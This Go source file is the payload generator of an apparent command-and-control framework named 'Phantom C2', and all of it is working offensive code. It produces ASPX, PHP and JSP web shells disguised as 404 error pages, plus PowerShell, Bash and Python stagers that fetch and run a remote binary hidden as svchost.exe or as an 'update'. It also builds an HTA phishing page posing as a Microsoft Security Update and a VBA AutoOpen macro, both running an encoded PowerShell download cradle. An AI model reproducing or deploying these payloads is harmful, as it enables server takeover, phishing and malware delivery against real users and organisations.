package payloads

import (
	"encoding/base64"
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"text/template"
)

// PayloadType identifies the kind of payload to generate.
type PayloadType string

const (
	PayloadASPX       PayloadType = "aspx"
	PayloadPHP        PayloadType = "php"
	PayloadJSP        PayloadType = "jsp"
	PayloadPowerShell PayloadType = "powershell"
	PayloadBash       PayloadType = "bash"
	PayloadPython     PayloadType = "python"
	PayloadHTA        PayloadType = "hta"
	PayloadVBA        PayloadType = "vba"
)

// PayloadConfig holds configuration for payload generation.
type PayloadConfig struct {
	Type        PayloadType
	ListenerURL string
	CallbackIP  string
	CallbackPort string
	OutputPath  string
	Obfuscate   bool
}

// Generate creates a stealthy payload based on the config.
func Generate(cfg PayloadConfig) (string, error) {
	var content string
	var err error
	var filename string

	switch cfg.Type {
	case PayloadASPX:
		content, err = generateASPX(cfg)
		filename = "update.aspx"
	case PayloadPHP:
		content, err = generatePHP(cfg)
		filename = "config.php"
	case PayloadJSP:
		content, err = generateJSP(cfg)
		filename = "status.jsp"
	case PayloadPowerShell:
		content, err = generatePowerShell(cfg)
		filename = "update.ps1"
	case PayloadBash:
		content, err = generateBash(cfg)
		filename = "update.sh"
	case PayloadPython:
		content, err = generatePython(cfg)
		filename = "config.py"
	case PayloadHTA:
		content, err = generateHTA(cfg)
		filename = "update.hta"
	case PayloadVBA:
		content, err = generateVBA(cfg)
		filename = "macro.vba"
	default:
		return "", fmt.Errorf("unknown payload type: %s", cfg.Type)
	}

	if err != nil {
		return "", err
	}

	// Write to output directory
	outDir := cfg.OutputPath
	if outDir == "" {
		outDir = "build/payloads"
	}
	os.MkdirAll(outDir, 0755)

	outPath := filepath.Join(outDir, filename)
	if err := os.WriteFile(outPath, []byte(content), 0644); err != nil {
		return "", err
	}

	return outPath, nil
}

// ── Web Shells ──

func generateASPX(cfg PayloadConfig) (string, error) {
	tmpl := `<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%
// Phantom C2 — ASPX Web Shell
// Disguised as application error handler
if (Request.Headers["X-Debug-Token"] == "{{.Token}}") {
    string cmd = Request.Form["data"];
    if (!string.IsNullOrEmpty(cmd)) {
        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = "cmd.exe";
        psi.Arguments = "/c " + cmd;
        psi.RedirectStandardOutput = true;
        psi.RedirectStandardError = true;
        psi.UseShellExecute = false;
        psi.CreateNoWindow = true;
        Process p = Process.Start(psi);
        string output = p.StandardOutput.ReadToEnd();
        output += p.StandardError.ReadToEnd();
        p.WaitForExit();
        Response.Write(output);
    }
} else {
    Response.StatusCode = 404;
    Response.Write("<html><head><title>404 - File Not Found</title></head>");
    Response.Write("<body><h1>404 - File Not Found</h1>");
    Response.Write("<p>The resource you are looking for has been removed.</p></body></html>");
}
%>`
	return renderTemplate(tmpl, cfg)
}

func generatePHP(cfg PayloadConfig) (string, error) {
	tmpl := `<?php
// Phantom C2 — PHP Web Shell
// Works on Apache/Nginx (mod_php/CGI) and php-cli (Flask/custom handlers)
error_reporting(0);

// Get auth token — check $_SERVER first (web server), then env (CLI)
$token = '';
if (isset($_SERVER['HTTP_X_DEBUG_TOKEN'])) {
    $token = $_SERVER['HTTP_X_DEBUG_TOKEN'];
} elseif (getenv('HTTP_X_DEBUG_TOKEN')) {
    $token = getenv('HTTP_X_DEBUG_TOKEN');
}

// Get command — check $_POST first (web server), then parse stdin (CLI)
$cmd = '';
if (isset($_POST['data'])) {
    $cmd = $_POST['data'];
} elseif (getenv('CONTENT_LENGTH') && getenv('CONTENT_LENGTH') > 0) {
    $input = file_get_contents('php://stdin');
    parse_str($input, $params);
    if (isset($params['data'])) $cmd = $params['data'];
}

if ($token === '{{.Token}}') {
    if ($cmd !== '') {
        $output = '';
        if (function_exists('exec')) {
            exec($cmd . ' 2>&1', $out);
            $output = implode("\n", $out);
        } elseif (function_exists('shell_exec')) {
            $output = shell_exec($cmd . ' 2>&1');
        } elseif (function_exists('system')) {
            ob_start();
            system($cmd . ' 2>&1');
            $output = ob_get_clean();
        } elseif (function_exists('passthru')) {
            ob_start();
            passthru($cmd . ' 2>&1');
            $output = ob_get_clean();
        } elseif (function_exists('popen')) {
            $handle = popen($cmd . ' 2>&1', 'r');
            $output = fread($handle, 65536);
            pclose($handle);
        }
        echo $output;
    } else {
        echo "ready";
    }
} else {
    if (php_sapi_name() !== 'cli') http_response_code(404);
    echo '<html><head><title>404</title></head><body><h1>Not Found</h1></body></html>';
}
?>`
	return renderTemplate(tmpl, cfg)
}

func generateJSP(cfg PayloadConfig) (string, error) {
	tmpl := `<%@ page import="java.io.*" %>
<%
// Phantom C2 — JSP Web Shell
String token = request.getHeader("X-Debug-Token");
if (token != null && token.equals("{{.Token}}")) {
    String cmd = request.getParameter("data");
    if (cmd != null) {
        String os = System.getProperty("os.name").toLowerCase();
        String[] command;
        if (os.contains("win")) {
            command = new String[]{"cmd.exe", "/c", cmd};
        } else {
            command = new String[]{"/bin/sh", "-c", cmd};
        }
        Process p = Runtime.getRuntime().exec(command);
        BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        while ((line = br.readLine()) != null) {
            out.println(line);
        }
        br = new BufferedReader(new InputStreamReader(p.getErrorStream()));
        while ((line = br.readLine()) != null) {
            out.println(line);
        }
    }
} else {
    response.setStatus(404);
    out.println("<html><head><title>404</title></head><body><h1>Not Found</h1></body></html>");
}
%>`
	return renderTemplate(tmpl, cfg)
}

// ── Stagers ──

func generatePowerShell(cfg PayloadConfig) (string, error) {
	// Downloads and executes the Phantom agent
	tmpl := `# Phantom C2 — PowerShell Stager
# Disguised as Windows Update check
$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

function Check-WindowsUpdate {
    $u = '{{.ListenerURL}}/api/v1/update'
    $w = New-Object System.Net.WebClient
    $w.Headers.Add('User-Agent', 'Microsoft-WNS/10.0')
    $p = [System.IO.Path]::GetTempPath() + 'svchost.exe'
    try {
        $w.DownloadFile($u, $p)
        $si = New-Object System.Diagnostics.ProcessStartInfo
        $si.FileName = $p
        $si.WindowStyle = 'Hidden'
        $si.CreateNoWindow = $true
        [System.Diagnostics.Process]::Start($si) | Out-Null
    } catch {}
}

# Anti-sandbox: check uptime
if ((Get-CimInstance Win32_OperatingSystem).LastBootUpTime -lt (Get-Date).AddMinutes(-5)) {
    Check-WindowsUpdate
}`
	return renderTemplate(tmpl, cfg)
}

func generateBash(cfg PayloadConfig) (string, error) {
	tmpl := `#!/bin/bash
# Phantom C2 — Bash Stager
# Disguised as system health check

check_update() {
    local url="{{.ListenerURL}}/api/v1/update"
    local tmp=$(mktemp /tmp/.update.XXXXXX)

    if command -v curl &>/dev/null; then
        curl -sk -o "$tmp" "$url" 2>/dev/null
    elif command -v wget &>/dev/null; then
        wget -q --no-check-certificate -O "$tmp" "$url" 2>/dev/null
    fi

    if [ -s "$tmp" ]; then
        chmod +x "$tmp"
        nohup "$tmp" >/dev/null 2>&1 &
    fi
}

check_update`
	return renderTemplate(tmpl, cfg)
}

func generatePython(cfg PayloadConfig) (string, error) {
	tmpl := `#!/usr/bin/env python3
# Phantom C2 — Python Stager
import urllib.request, subprocess, tempfile, os, platform

def check_update():
    url = '{{.ListenerURL}}/api/v1/update'
    try:
        import ssl
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        req = urllib.request.Request(url, headers={'User-Agent': 'Python-urllib/3.10'})
        resp = urllib.request.urlopen(req, context=ctx)
        data = resp.read()
        if data:
            ext = '.exe' if platform.system() == 'Windows' else ''
            fd, path = tempfile.mkstemp(suffix=ext, prefix='.update')
            os.write(fd, data)
            os.close(fd)
            os.chmod(path, 0o755)
            subprocess.Popen([path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        pass

check_update()`
	return renderTemplate(tmpl, cfg)
}

func generateHTA(cfg PayloadConfig) (string, error) {
	// Base64 encode a PowerShell download cradle
	psCradle := fmt.Sprintf(`$w=New-Object System.Net.WebClient;$w.Headers.Add('User-Agent','Microsoft-WNS/10.0');$p=$env:TEMP+'\svchost.exe';$w.DownloadFile('%s/api/v1/update',$p);Start-Process $p -WindowStyle Hidden`, cfg.ListenerURL)
	b64 := base64.StdEncoding.EncodeToString([]byte(psCradle))

	tmpl := fmt.Sprintf(`<html>
<head>
<title>Microsoft Security Update</title>
<HTA:APPLICATION ID="update" APPLICATIONNAME="Security Update"
  BORDER="thin" BORDERSTYLE="normal" CAPTION="yes"
  ICON="%%windir%%\system32\SecurityHealthSysTray.exe"
  SHOWINTASKBAR="no" SINGLEINSTANCE="yes" SYSMENU="no"
  WINDOWSTATE="minimize">
</head>
<body>
<script language="VBScript">
Sub Window_OnLoad
    Dim shell
    Set shell = CreateObject("WScript.Shell")
    shell.Run "powershell -ep bypass -w hidden -enc %s", 0, False
    self.Close
End Sub
</script>
<p>Installing security update...</p>
</body>
</html>`, b64)

	return tmpl, nil
}

func generateVBA(cfg PayloadConfig) (string, error) {
	psCradle := fmt.Sprintf(`powershell -ep bypass -w hidden -c "$w=New-Object System.Net.WebClient;$p=$env:TEMP+'\\svchost.exe';$w.DownloadFile('%s/api/v1/update',$p);Start-Process $p -WindowStyle Hidden"`, cfg.ListenerURL)

	tmpl := fmt.Sprintf(`' Phantom C2 — VBA Macro Stager
' Insert into Word/Excel macro
Sub AutoOpen()
    Dim shell As Object
    Set shell = CreateObject("WScript.Shell")
    shell.Run "%s", 0, False
End Sub

Sub Document_Open()
    AutoOpen
End Sub`, strings.ReplaceAll(psCradle, `"`, `""`))

	return tmpl, nil
}

// ── Helpers ──

type templateData struct {
	ListenerURL  string
	CallbackIP   string
	CallbackPort string
	Token        string
}

func renderTemplate(tmpl string, cfg PayloadConfig) (string, error) {
	// Generate auth token from listener URL hash
	token := generateToken(cfg.ListenerURL)

	data := templateData{
		ListenerURL:  cfg.ListenerURL,
		CallbackIP:   cfg.CallbackIP,
		CallbackPort: cfg.CallbackPort,
		Token:        token,
	}

	t, err := template.New("payload").Parse(tmpl)
	if err != nil {
		return "", err
	}

	var buf strings.Builder
	if err := t.Execute(&buf, data); err != nil {
		return "", err
	}

	return buf.String(), nil
}

func generateToken(seed string) string {
	// Simple deterministic token from seed
	h := uint64(0)
	for _, c := range seed {
		h = h*31 + uint64(c)
	}
	return fmt.Sprintf("%016x", h)
}

// ListPayloadTypes returns all available payload types with descriptions.
func ListPayloadTypes() []struct {
	Type PayloadType
	Desc string
} {
	return []struct {
		Type PayloadType
		Desc string
	}{
		{PayloadASPX, "ASPX web shell (.aspx) — IIS/ASP.NET servers"},
		{PayloadPHP, "PHP web shell (.php) — Apache/Nginx/PHP servers"},
		{PayloadJSP, "JSP web shell (.jsp) — Tomcat/Java servers"},
		{PayloadPowerShell, "PowerShell stager (.ps1) — Windows download & execute"},
		{PayloadBash, "Bash stager (.sh) — Linux download & execute"},
		{PayloadPython, "Python stager (.py) — Cross-platform download & execute"},
		{PayloadHTA, "HTA application (.hta) — Windows phishing payload"},
		{PayloadVBA, "VBA macro (.vba) — Office document macro"},
	}
}
